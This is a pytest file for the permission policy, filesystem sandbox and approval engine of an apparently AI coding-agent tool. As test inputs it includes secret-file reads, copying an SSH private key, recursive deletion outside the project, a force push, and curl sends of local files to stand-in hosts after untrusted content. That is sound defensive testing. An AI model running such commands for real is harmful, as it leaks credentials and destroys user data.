import os
from pathlib import Path

import pytest

from rinari.policy.approvals import (
    ApprovalEngine,
    ApprovalRequest,
)
from rinari.policy.engine import (
    CAPABILITY_FS_READ,
    CAPABILITY_FS_WRITE,
    CAPABILITY_SHELL,
    PermissionProfile,
    PolicyAction,
    PolicyEngine,
    SessionScope,
    classify_git_remote,
    is_sensitive_file,
    normalize_profile,
)
from rinari.policy.sandbox import FilesystemSandbox
from rinari.shared.errors import SandboxViolationError

PROJECT = Path("/proj")
HOME = Path("/home/xainner")


def _scope(
    kind="PROJECT", profile="workspace", root=PROJECT, cwd=PROJECT, home=HOME
) -> SessionScope:
    return SessionScope(
        kind=kind,
        root=root if root is not None else None,
        cwd=cwd,
        profile=normalize_profile(profile),
        user_home=home,
    )


# -- profile normalization ------------------------------------------------


def test_normalize_profile() -> None:
    assert normalize_profile(None) is PermissionProfile.WORKSPACE
    assert normalize_profile("safe") is PermissionProfile.READ_ONLY
    assert normalize_profile("read-only") is PermissionProfile.READ_ONLY
    assert normalize_profile("workspace") is PermissionProfile.WORKSPACE
    assert normalize_profile("full-access") is PermissionProfile.FULL_ACCESS
    assert normalize_profile("bogus") is PermissionProfile.WORKSPACE


# -- filesystem read --------------------------------------------------------


def test_read_inside_root_allowed() -> None:
    d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(), path="src/a.py")
    assert d.action is PolicyAction.ALLOW


def test_read_outside_root_is_free_in_workspace() -> None:
    d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(), path="/etc/passwd")
    assert d.action is PolicyAction.ALLOW


def test_read_outside_root_is_free_in_read_only() -> None:
    d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(profile="read-only"), path="/etc/passwd")
    assert d.action is PolicyAction.ALLOW


def test_read_outside_root_full_access_allowed() -> None:
    d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(profile="full-access"), path="/etc/passwd")
    assert d.action is PolicyAction.ALLOW


def test_system_secret_asks_even_full_access() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_FS_READ, _scope(profile="full-access"), path="/home/xainner/.ssh/id_ed25519"
    )
    assert d.action is PolicyAction.ASK
    assert d.rule_id == "system_secret"
    assert "allow_project" not in d.choices


def test_project_env_files_are_ordinary_work() -> None:
    for path in ("/proj/.env", "/proj/.env.example", "/proj/credentials.json"):
        d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(), path=path)
        assert d.action is PolicyAction.ALLOW, path
        w = PolicyEngine().decide(CAPABILITY_FS_WRITE, _scope(), path=path)
        assert w.action is PolicyAction.ALLOW, path


def test_sensitive_file_detection() -> None:
    assert is_sensitive_file(Path("/x/.env"))
    assert is_sensitive_file(Path("/x/.env.prod"))
    assert is_sensitive_file(Path("/x/id_rsa"))
    assert is_sensitive_file(Path("/x/credentials.json"))
    assert not is_sensitive_file(Path("/x/main.py"))
    assert not is_sensitive_file(Path("/x/env.txt"))


# -- filesystem write -------------------------------------------------------


def test_write_inside_project_workspace_allowed() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_FS_WRITE, _scope(), path="src/b.py", risk="medium", risk_class="local-reversible"
    )
    assert d.action is PolicyAction.ALLOW


def test_write_read_only_denied() -> None:
    d = PolicyEngine().decide(CAPABILITY_FS_WRITE, _scope(profile="read-only"), path="src/b.py")
    assert d.action is PolicyAction.DENY


def test_write_outside_project_asks() -> None:
    d = PolicyEngine().decide(CAPABILITY_FS_WRITE, _scope(), path="/elsewhere/x.py")
    assert d.action is PolicyAction.ASK


def test_write_chat_session_asks() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_FS_WRITE,
        _scope(kind="CHAT", root=HOME, cwd=HOME),
        path="notes.md",
    )
    assert d.action is PolicyAction.ASK


def test_write_outside_project_asks_and_can_be_granted_for_good() -> None:
    d = PolicyEngine().decide(CAPABILITY_FS_WRITE, _scope(), path="/home/xainner/notes.md")
    assert d.action is PolicyAction.ASK
    assert d.rule_id == "write_outside_root"
    assert "allow_project" in d.choices


def test_write_home_chat_workspace_asks_not_allows() -> None:
    # CHAT at $HOME with the default profile: writing into $HOME is never
    # an implicit workspace (AGENTS.md section 13) - it must ask.
    d = PolicyEngine().decide(
        CAPABILITY_FS_WRITE,
        _scope(kind="CHAT", profile="workspace", root=HOME, cwd=HOME),
        path="evil.py",
    )
    assert d.action is PolicyAction.ASK


def test_write_home_chat_full_access_is_explicit_choice() -> None:
    # CHAT at $HOME with the EXPLICIT full-access profile: the user selected
    # broad access knowingly; the $HOME invariant targets implicit workspaces.
    d = PolicyEngine().decide(
        CAPABILITY_FS_WRITE,
        _scope(kind="CHAT", profile="full-access", root=HOME, cwd=HOME),
        path="evil.py",
    )
    assert d.action is PolicyAction.ALLOW


def test_write_outside_project_full_access_is_allowed() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_FS_WRITE,
        _scope(profile="full-access"),
        path="/home/xainner/other-project/file.py",
    )
    assert d.action is PolicyAction.ALLOW


# -- shell --------------------------------------------------------------------


def test_shell_project_workspace_allowed() -> None:
    d = PolicyEngine().decide(CAPABILITY_SHELL, _scope(), command="pytest -q")
    assert d.action is PolicyAction.ALLOW


def test_shell_read_only_denied() -> None:
    d = PolicyEngine().decide(CAPABILITY_SHELL, _scope(profile="read-only"), command="ls")
    assert d.action is PolicyAction.DENY


def test_shell_chat_runs_but_writing_into_home_asks() -> None:
    chat = _scope(kind="CHAT", root=None, cwd=HOME)
    assert PolicyEngine().decide(CAPABILITY_SHELL, chat, command="ls").action is PolicyAction.ALLOW
    touch = PolicyEngine().decide(CAPABILITY_SHELL, chat, command="touch ./evil.txt")
    assert touch.action is PolicyAction.ASK


def test_shell_workspace_external_write_asks() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_SHELL,
        _scope(),
        command="cp result.txt ../elsewhere/result.txt",
    )
    assert d.action is PolicyAction.ASK
    assert d.rule_id == "shell_external_mutation"


def test_shell_full_access_external_write_allowed() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_SHELL,
        _scope(profile="full-access"),
        command="Set-Content ../elsewhere/result.txt ok",
    )
    assert d.action is PolicyAction.ALLOW


def test_shell_secret_target_asks_without_a_lasting_grant() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_SHELL,
        _scope(profile="full-access"),
        command="cp /home/xainner/.ssh/id_rsa ./key",
    )
    assert d.action is PolicyAction.ASK
    assert d.rule_id == "system_secret"
    assert "allow_project" not in d.choices


def test_git_push_is_free_in_full_access_and_asks_in_workspace() -> None:
    full = PolicyEngine().decide(
        CAPABILITY_SHELL, _scope(profile="full-access"), command="git push origin main"
    )
    assert full.action is PolicyAction.ALLOW
    work = PolicyEngine().decide(CAPABILITY_SHELL, _scope(), command="git push origin main")
    assert work.action is PolicyAction.ASK
    assert work.rule_id == "git_remote_mutation"
    assert "allow_project" in work.choices


def test_shell_force_push_asks_critical() -> None:
    d = PolicyEngine().decide(
        CAPABILITY_SHELL, _scope(profile="full-access"), command="git push --force"
    )
    assert d.action is PolicyAction.ASK
    assert d.risk == "critical"


def test_classify_git_remote() -> None:
    assert classify_git_remote("git push origin main") == "remote"
    assert classify_git_remote("git push --force origin") == "force"
    assert classify_git_remote("git push -f") == "force"
    assert classify_git_remote("git status") is None
    assert classify_git_remote("echo git push") is None


# -- sandbox: escape ---------------------------------------------------------


def test_sandbox_blocks_traversal(tmp_path) -> None:
    root = tmp_path / "root"
    (root / "sub").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    sandbox = FilesystemSandbox(root, write_roots=(root,))
    resolved = sandbox.resolve("../outside/file.txt", base=root)
    assert resolved == (outside / "file.txt").resolve()
    with pytest.raises(SandboxViolationError):
        sandbox.assert_readable(resolved)
    with pytest.raises(SandboxViolationError):
        sandbox.assert_writable(resolved)


def test_sandbox_blocks_symlink_escape(tmp_path) -> None:
    root = tmp_path / "root"
    root.mkdir()
    outside = tmp_path / "secret.txt"
    outside.write_text("top secret", encoding="utf-8")
    link = root / "link.txt"
    try:
        os.symlink(outside, link)
    except OSError as exc:
        pytest.skip(f"symlinks not permitted on this host: {exc}")
    sandbox = FilesystemSandbox(root, write_roots=())
    resolved = sandbox.resolve("link.txt", base=root)
    assert resolved == outside.resolve()
    with pytest.raises(SandboxViolationError):
        sandbox.assert_writable(resolved)


def test_sandbox_junction_like_escape(tmp_path) -> None:
    # relative traversal through a nested path is canonicalized the same way
    root = tmp_path / "root"
    (root / ".hidden").mkdir(parents=True)
    sandbox = FilesystemSandbox(root, write_roots=(root,))
    resolved = sandbox.resolve(".hidden/../../escape.txt", base=root)
    assert resolved == (tmp_path / "escape.txt").resolve()
    with pytest.raises(SandboxViolationError):
        sandbox.assert_writable(resolved)


def test_sandbox_allows_inside_write_root(tmp_path) -> None:
    root = tmp_path / "root"
    (root / "sub").mkdir(parents=True)
    sandbox = FilesystemSandbox(root, write_roots=(root,))
    resolved = sandbox.resolve("sub/file.txt", base=root)
    sandbox.assert_writable(resolved)
    sandbox.assert_readable(resolved)


def test_sandbox_write_only_inside_granted_root(tmp_path) -> None:
    root = tmp_path / "proj"
    home = tmp_path / "home"
    home.mkdir(parents=True)
    root.mkdir()
    sandbox = FilesystemSandbox(root, write_roots=(root,))
    target = home / "file.txt"
    with pytest.raises(SandboxViolationError):
        sandbox.assert_writable(target.resolve())


def test_sandbox_no_read_root(tmp_path) -> None:
    sandbox = FilesystemSandbox(None)
    with pytest.raises(SandboxViolationError):
        sandbox.assert_readable(tmp_path)


def test_explicit_full_access_sandbox_allows_canonical_external_paths(tmp_path) -> None:
    sandbox = FilesystemSandbox(None, unrestricted=True)
    external = (tmp_path.parent / "other-root" / "file.txt").resolve()
    sandbox.assert_readable(external)
    sandbox.assert_writable(external)


def test_private_change_snapshots_are_denied_even_with_full_access(tmp_path) -> None:
    private_root = (tmp_path / "rinari-home" / "change-blobs").resolve()
    scope = SessionScope(
        "CHAT",
        tmp_path,
        tmp_path,
        PermissionProfile.FULL_ACCESS,
        private_roots=(private_root,),
    )
    policy = PolicyEngine()
    target = private_root / "aa" / ("a" * 64)
    assert policy.decide(CAPABILITY_FS_READ, scope, path=target).action is PolicyAction.DENY
    assert policy.decide(CAPABILITY_FS_WRITE, scope, path=target).action is PolicyAction.DENY
    shell = policy.decide(
        CAPABILITY_SHELL,
        scope,
        command=f'Set-Content "{target}" value',
    )
    assert shell.action is PolicyAction.DENY
    assert shell.rule_id == "private_change_snapshot"


# -- approvals -----------------------------------------------------------------


def test_approval_requires_prompt_when_no_grant() -> None:
    engine = ApprovalEngine(prompt=lambda req: "n")
    outcome = engine.check(
        ApprovalRequest(capability=CAPABILITY_FS_WRITE, description="w", target="/x")
    )
    assert outcome.granted is False


def test_approval_once_not_reused() -> None:
    answers = iter(["y", "n"])
    engine = ApprovalEngine(prompt=lambda req: next(answers))
    req = ApprovalRequest(capability=CAPABILITY_FS_WRITE, description="w", target="/x")
    assert engine.check(req).granted is True
    assert engine.check(req).granted is False


def test_session_scope_reused_within_session_only() -> None:
    engine = ApprovalEngine(prompt=lambda req: "s")
    req = ApprovalRequest(
        capability=CAPABILITY_FS_WRITE, description="w", target="/x", session_id="s1"
    )
    assert engine.check(req).granted is True
    assert engine.check(req).granted is True  # same session
    other = ApprovalRequest(
        capability=CAPABILITY_FS_WRITE, description="w", target="/x", session_id="s2"
    )
    engine2 = ApprovalEngine(prompt=lambda r: "n")
    # grant is per engine-instance (per session runtime), so a new engine has none
    assert engine2.check(other).granted is False


def test_project_scope_shared_across_sessions_of_project() -> None:
    answers = iter(["p", "n"])
    engine = ApprovalEngine(prompt=lambda req: next(answers))
    req1 = ApprovalRequest(
        capability=CAPABILITY_FS_WRITE,
        description="w",
        target="/x",
        project_id="p1",
        session_id="s1",
    )
    req2 = ApprovalRequest(
        capability=CAPABILITY_FS_WRITE,
        description="w",
        target="/x",
        project_id="p1",
        session_id="s2",
    )
    assert engine.check(req1).granted is True
    assert engine.check(req2).granted is True
    other_project = ApprovalRequest(
        capability=CAPABILITY_FS_WRITE,
        description="w",
        target="/x",
        project_id="p2",
        session_id="s3",
    )
    assert engine.check(other_project).granted is False


def test_persistent_scope_stored() -> None:
    store: dict = {}
    engine = ApprovalEngine(prompt=lambda req: "a", persistent_store=store)
    req = ApprovalRequest(
        capability=CAPABILITY_FS_WRITE, description="w", target="/x", session_id="s1"
    )
    assert engine.check(req).granted is True
    assert len(store) == 1
    engine2 = ApprovalEngine(prompt=lambda r: "n", persistent_store=store)
    assert engine2.check(req).granted is True  # persistent grant honored


def test_no_approval_fatigue_for_allowed_reads() -> None:
    # reads inside root never reach the approval engine (policy = allow)
    d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(), path="a.py")
    assert d.action is PolicyAction.ALLOW
    assert d.action is not PolicyAction.ASK


def test_non_reusable_request_ignores_session_grant() -> None:
    answers = iter(("s", "n"))
    engine = ApprovalEngine(prompt=lambda _req: next(answers))
    ordinary = ApprovalRequest(
        capability=CAPABILITY_SHELL,
        description="ordinary",
        session_id="s1",
    )
    assert engine.check(ordinary).granted is True
    locked = ApprovalRequest(
        capability=CAPABILITY_SHELL,
        description="git push",
        session_id="s1",
        reusable=False,
        choices=("deny", "allow_once"),
    )
    assert engine.check(locked).granted is False


def test_audit_trail() -> None:
    engine = ApprovalEngine(prompt=lambda req: "y")
    engine.check(ApprovalRequest(capability="fs.write", description="w", target="/x"))
    audit = engine.audit()
    assert len(audit) == 1
    assert audit[0].granted is True


# -- permissions v3: hard list, untrusted content, local network -------------

from dataclasses import replace as _replace  # noqa: E402

from rinari.policy.engine import (  # noqa: E402
    CAPABILITY_MCP_WRITE,
    CAPABILITY_NETWORK,
    CAPABILITY_SESSION_MESSAGE,
)


def test_hard_list_asks_in_full_access_and_never_for_good() -> None:
    full = _scope(profile="full-access")
    force = PolicyEngine().decide(CAPABILITY_SHELL, full, command="git push --force origin main")
    delete = PolicyEngine().decide(CAPABILITY_SHELL, full, command="rm -rf /home/xainner/Music")
    for d in (force, delete):
        assert d.action is PolicyAction.ASK
        assert d.choices == ("deny", "allow_once")
        assert d.reusable is False
    assert delete.rule_id == "delete_outside_root"
    inside = PolicyEngine().decide(CAPABILITY_SHELL, full, command="rm -rf ./build")
    assert inside.action is PolicyAction.ALLOW


def test_full_access_acts_without_asking() -> None:
    full = _scope(profile="full-access")
    engine = PolicyEngine()
    assert engine.decide(CAPABILITY_MCP_WRITE, full).action is PolicyAction.ALLOW
    assert (
        engine.decide(CAPABILITY_NETWORK, full, host="api.example.com", network_mode="send").action
        is PolicyAction.ALLOW
    )
    assert (
        engine.decide(CAPABILITY_SESSION_MESSAGE, full, target="ses_b").action is PolicyAction.ALLOW
    )
    assert engine.decide("capability.activate", full).action is PolicyAction.ALLOW
    assert engine.decide("state.mutate", _scope()).action is PolicyAction.ALLOW


def test_after_external_content_sending_out_asks_even_in_full_access() -> None:
    tainted = _replace(_scope(profile="full-access"), external_content=True)
    engine = PolicyEngine()
    for decision in (
        engine.decide(CAPABILITY_NETWORK, tainted, host="evil.example", network_mode="send"),
        engine.decide(CAPABILITY_MCP_WRITE, tainted),
        engine.decide(CAPABILITY_SHELL, tainted, command="git push origin main"),
        engine.decide(CAPABILITY_SHELL, tainted, command="curl -d @notes.txt https://x.example"),
    ):
        assert decision.action is PolicyAction.ASK
        assert decision.rule_id == "external_content_send"
        assert "allow_project" not in decision.choices
    # Reading more, and local work, stay free.
    assert (
        engine.decide(CAPABILITY_NETWORK, tainted, host="docs.example").action is PolicyAction.ALLOW
    )
    assert engine.decide(CAPABILITY_SHELL, tainted, command="npm test").action is PolicyAction.ALLOW


def test_local_network_is_free_and_internet_sends_ask_in_workspace() -> None:
    engine = PolicyEngine()
    work = _scope()
    for host in ("127.0.0.1", "localhost", "192.168.0.3", "casa3090"):
        assert (
            engine.decide(CAPABILITY_NETWORK, work, host=host, network_mode="send").action
            is PolicyAction.ALLOW
        ), host
    send = engine.decide(CAPABILITY_NETWORK, work, host="api.example.com", network_mode="send")
    assert send.action is PolicyAction.ASK
    assert send.binding_mode == "exact"
    read_only = engine.decide(
        CAPABILITY_NETWORK, _scope(profile="read-only"), host="api.example.com", network_mode="send"
    )
    assert read_only.action is PolicyAction.DENY


def test_shell_classification_false_positives() -> None:
    engine = PolicyEngine()
    work = _scope()
    for command in (
        r"move /y build\hero.mp4 assets\video\ >nul",
        'ssh casa3090 "docker exec db pg_dump -U app > /tmp/dump.sql"',
        "echo ok 2>NUL",
    ):
        assert (
            engine.decide(CAPABILITY_SHELL, work, command=command).action is PolicyAction.ALLOW
        ), command
